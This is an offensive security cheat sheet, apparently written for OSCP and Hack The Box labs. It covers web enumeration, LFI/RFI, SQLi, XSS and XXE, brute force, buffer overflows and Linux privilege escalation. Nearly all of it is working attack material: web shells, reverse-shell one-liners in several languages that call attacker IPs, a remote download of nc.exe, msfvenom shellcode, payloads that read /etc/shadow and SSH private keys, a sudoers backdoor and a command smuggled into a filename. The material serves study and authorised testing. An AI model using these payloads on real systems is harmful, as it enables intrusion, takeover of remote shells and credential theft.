wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ
wfuzz -c --hc=403,404 -t 500 -w /usr/share/wordlists/dirb/big.txt -w extensions.txt http://10.10.10.56/FUZZ.FUZ2Z (two dictionaries, when you want fuzz a extension)

# GoBuster
gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

./dirsearch.py -u 10.10.10.157 -e php

medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10

Crawl:

dirhunt https://url.com/
hakrwaler https://url.com/

Fuzzer:

ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://url.com/FUZZ

dirsearch -r -f -u https://crm.comprarcasa.pt --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40

#IIS
#ViewState:
https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC

#WebResource.axd:
https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py

#ShortNames
https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://domain.es

#Jenkins
JENKINSIP/PROJECT//securityRealm/user/admin
JENKINSIP/jenkins/script

#Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";
#Groovy RevShell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# PHP bypass disable_functions and open_basedir
# Chankro
https://github.com/TarlogicSecurity/Chankro
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html

# Cookies error padding:
# Get cookie structure
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
# Get cookie for other user (impersonation)
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorme'
```


### Default/Weak login

Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```


### LFI/RFI


```
fimap -u "http://10.11.1.111/example.php?test="

# Ordered output
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd

/root/Tools/Kadimus/kadimus -u http://10.11.1.111/example.php?page=

http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php

http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ??page=php://filter/convert.base64-encode/resource=../config.php

../../../../../boot.ini

amap -d 10.11.1.111 8000

# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 
 
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config

Read the code of PHP file:
http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/[RESOURCE].php

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

# RFI over SMB (Windows)
cat php_cmd.php
	<?php echo shell_exec($_GET['cmd']);?>
	
- Start SMB Server in attacker machine and put evil script

- Access it via browser (2 request attack):

	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
	
	- http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

```

### SQLi

```
# References
https://www.exploit-db.com/papers/17934
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - THE GOOD ONE
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

# NoSQL
' || 'a'=='a
mongodbserver:port/status?text=1

#in URL
username[$ne]=toto&password[$ne]=toto

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

## SSRF

web that send request to external IP's, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network

chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1

Also we can enum ports
```

### XSS Port 80

```
<script>alert("XSS")</script>
<script>alert(1)</script>

https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE

XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>Hack The &book;</thp>
    
Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The
%26book%3B</thp>

XXE OOB

<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
<!ENTITY % dtd SYSTEM "http://[YOUR_IP]/payload.dtd"> %dtd;]>
<thp><error>%26send%3B</error></thp>
```

### Sql-login-bypass

- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

### Bypass image upload restrictions

```
- Change extension: .pHp3 or pHp3.jpg
- Modify mimetype: Content-type: image/jpeg
- Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
- Add gif header: 
	. GIF89a;
	. JFIF; <?php echo "<pre>"; system($_GET['cmd']); ?>
- All at the same time.
```

## Password brute force - last resort

Offline local resources

```
cewl
hash-identifier
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
hydra -l root -P password-file.txt 10.11.1.111 ssh
hydra -P password-file.txt -v 10.11.1.111 snmp
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V

# SIMPLE LOGIN GET
hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V

# GET FORM with HTTPS
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.111 -s 443 -S https-get-form "/index.php:login=^USER^&password=^PASS^:Incorrect login/password\!"

# SIMPLE LOGIN POST
hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# API REST LOGIN POST
hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64

# Dictionary creation
https://github.com/LandGrey/pydictor
https://github.com/Mebus/cupp
git clone https://github.com/sc0tfree/mentalist.git
```

Online crackers

```
https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
```

# **Vulnerability analysis**

## BOF

```
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E10.11.1.111 offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
with script _badchars.py and 
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
	5.1 AWESOME WAY TO CHECK BADCHARS (https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/):
		a. !mona config -set workingfolder c:\logs\%p
	    b. !mona bytearray -b "\x00\x0d"
	    c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
	    d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
	    e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"
 
	6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
	6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.111 LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

```



```
################ sample 1 ################################################
#!/usr/bin/python

import socket,sys

if len(sys.argv) != 3:
    print("usage: python fuzzer.py 10.11.1.111 PORT")
    exit(1)

payload = "A" * 1000

ipAddress = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    print "Sending payload"
    s.send(payload)
    print "Done"
    s.close()
except:
    print "Error"
    sys.exit(0)

################ sample 2 ################################################
#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
```



## Find xploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```bash
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

## Reverse Shells

```bash
# Netcat Linux
nc -e /bin/sh target 4443

#Netcat Windows
nc -e cmd.exe target 4443

# Bash
bash -i >& /dev/tcp/target/4443 0>&1

# Linux 
Use "rlwrap" for see all previous commands in your reverse shell
bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

# Perl
perl -e 'use Socket;$i="10.11.1.111";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe 10.11.1.111 4443
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP most simple Linux
<?php $sock = fsockopen("10.11.1.111",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>

# Remote Desktop (Remote Desktop for windows with share and 85% screen)
rdesktop -u username -p password -g 85% -r disk:share=/root/ target

# PHP
 - PHP command injection from GET Request
<?php echo system($_GET["cmd"]);?>

 - Alternative
<?php echo shell_exec($_GET["cmd"]);?>
```

## Elastix and vtigercrm 
```
# LFI (vtigercrm version 5.1.0)

https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00

# Path with information about Asterik

https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

# File Upload (vtigercrm version 5.1.0)

Path: "Settings --> Company Details --> Edit" and upload a PHP reverse shell with extension JPG

Reference: Beep (htb)
```

## NVMS
```
# Metasploit

msf5 > search nvms
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH <path_for_read_file>
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS <ip_victim>
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

# NSClient++

https://www.exploit-db.com/exploits/46802

Reference: servmon box (htb)
```


## Alternate Data Stream
```
# When a file have 0 BYTES

# Alternate Data Streams or ADSs are a feature of the NTFS file system that allow you to store meta information with a file, without the need to use a separate file to store it.

=== Windows ====

# Create a normal text file

echo "texto dentro del archivo" >archivo.txt

# Create an ADS from file.txt

echo "flujo alternativo de datos de archivo" >archivo.txt:flujo.txt

# The normal way to view a text file by console is to use the "type" command like this:

type archivo.txt
texto dentro del archivo

# However, it does not work with ADS

type archivo.txt:flujo.txt
The filename, directory name, or volume label syntax is incorrect.

# In order to see the alternative flow of data it is necessary to use the "more" command in this way:

1) more < archivo.txt:flujo.txt
flujo alternativo de datos de archivo

2) more "archivo.txt:flujo.txt"
flujo alternativo de datos de archivo

# It is also possible to edit the alternative flow of data using a graphic text editor as in Windows Notepad, only you have to open it by console in this way:

notepad archivo.txt:flujo.txt
```


# **Privilege escalation**

## Common

```
# Docker
https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

# Found files "sdf"
find . -iname "*.sdf"

```

### Set up Webserver

```
python -m SimpleHTTPServer 8080
https://github.com/sc0tfree/updog
updog
```

### Set up FTP Server

```
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

### Set up TFTP

````
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
````

### Upgrade Shell

````
• script /dev/null -c bash
• Ctrl+Z
• stty raw -echo
• f+g
• reset
• xterm
• export TERM=xterm
• export SHELL=bash
````
Verify that NANO gives us the proportions, otherwise from our terminal:
````
• stty -a
````
Import the row and column values:
````
• stty rows [NUMBER] columns [NUMBER]

````

### Insecure Functions
Search inside a "file" the next dangerous functions:

PHP:
````
escapeshellcmd
eval
exec
inject_code
shell_exec
````

## Linux

Now we start the whole enumeration-process over gain.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems
- Look in /var/backups
- Look in /etc/fstab y en mount

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs

### Useful commands

```
# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
V
Ctrl+Z
stty raw -echo
fg
reset
Ctrl+Z
stty size
stty -rows 48 -columns 120
fg

echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard

# Writable directories
/tmp
/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers


# See the Operating System
cat /etc/os-release
```

### Basic info

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts
upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
```

### Kernel exploits

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password
```

### Inside service

```
# Linux
netstat -anlp
netstat -ano
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
nmap
vim
nano
```

```
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```

### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### Bad path configuration

Require user interaction

### Find plain passwords

```
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

### Scripts

#### SUID

```
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

# Compile
gcc suid.c -o suid
```

#### PS Monitor for cron

```
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done

```

### Linux Privesc Tools

- [GTFOBins](https://gtfobins.github.io/)
- [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [LinuxExploitSuggester](https://gitlab.com/kalilinux/packages/linux-exploit-suggester/blob/kali/master/Linux_Exploit_Suggester.pl)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

### Linux Precompiled Exploits
- [kernel-exploits](https://github.com/lucyoa/kernel-exploits)

### Nohup
Nohup is a command that tells the Linux system not to stop another command once it has started.

Syntax:
```
nohup sh [your-script.sh] &
```
Notice the "&" at the end of the command. That moves the command to the bottom, freeing up the terminal you're working on.


You can try this technique when an argument is passed by value and you can modify the param "value". If a "cronjob" run this script "test.sh" each 1 min, the way for exploit this is the next:

```
test.sh:
nohup /bin/rm -f $path$value

Inside of "path" directory create a "file" with this name:
touch -- ";nc -c bash 10.10.14.39 4321"

And wait for the "cronjob" run.
```

### RedHat / CentOS
If you OS is a RedHat or CentOS, you can try found a "network-scripts":

```
# Search for "network-scripts" that the current user can run like root:
sudo -l

# Run this file like root:
sudo -u root [file_script]

# In the assignament of INTERCACE_NAME, PROXY_METHOD, BROWSER_ONLY, etc. you can insert the command that you want:
interface NAME:
[cgonzalo bash]
interface PROXY_METHOD:
[...]
[...]
[...]
Then you won the shell like root.

Reference: See "Networked" box (htb)
```

## GTFObins
```
-----------------
--- Systemctl ---
-----------------

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/bin/systemctl
...

# You can try exploit this creating a service

# Create the service "/dev/shm/root.service", "/home/user/" or "/your/path"

°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
echo '[Unit]
Description=cgonzalo

[Service]
ExecStart=/bin/nc 10.10.14.31 9555 -e /bin/bash

[Install]
WantedBy=multi-user.target' > cgonzalo.service
°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°

# Create symlink to service

systemctl link /home/pepper/cgonzalo.service

# Enable service

systemctl enable --now /home/pepper/cgonzalo.service

Take you revShell.

Reference: jarvis box (htb)

############################################################################

-----------------
----- nmap ------
-----------------

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/usr/bin/nmap
...

# You can try exploit this with GTFObins for nmap

sudo /usr/bin/nmap --interactive
nmap> !sh

https://gtfobins.github.io/gtfobins/nmap/

Reference: beep box (htb)

############################################################################

-----------------
----- tmux ------
-----------------

# If you realize

ps aux

# And found one session tmux running like "root", you can try

tmux -S /path/of/session

# If you run 

find / -perm -4000 2>/dev/null
sudo -l

# Try https://gtfobins.github.io/gtfobins/tmux/

sudo tmux

############################################################################

-----------------
---- sysinfo ----
-----------------

# If you run

find / -perm -4000 2>/dev/null
sudo -l

# And the response is

...
/bin/sysinfo
...

# You need know how this work and the CVE reported (https://labs.f-secure.com/advisories/magnicomps-sysinfo-root-setuid-local-privilege-escalation-vulnerability/)

# Description

MagniComp's SysInfo enables system administrators to find and view highly detailed system, software, and hardware information on a variety of platforms.

# Impact

This vulnerability allows local users to gain root privilege and hence full control over the affected system.

# You need to know

This process work with a tool called "lshw" (https://www.linuxadictos.com/lshw-obten-informacion-del-hardware-gnulinux.html)

# We can exploit this creating a fake LSHW file and run it with a payload

1) See the section "Hardware Info" from "sysinfo" process and choose one for exploit

===Hardware Info===
lshw -short

===Disk Info===
fdisk -l

===CPU Info===
cat /proc/cpuinfo 

2) cat lshw (machine ATTACKER)

	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.40",9444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

3) /tmp/cgonzalo:$ wget http://<ip_attacker>:<port>/lshw

4) /tmp/cgonzalo:$ chmod +x lshw

5) /tmp/cgonzalo:$ export PATH=/tmp/cgonzalo:$PATH export PATH=/tmp/cgonzalo:$PATH

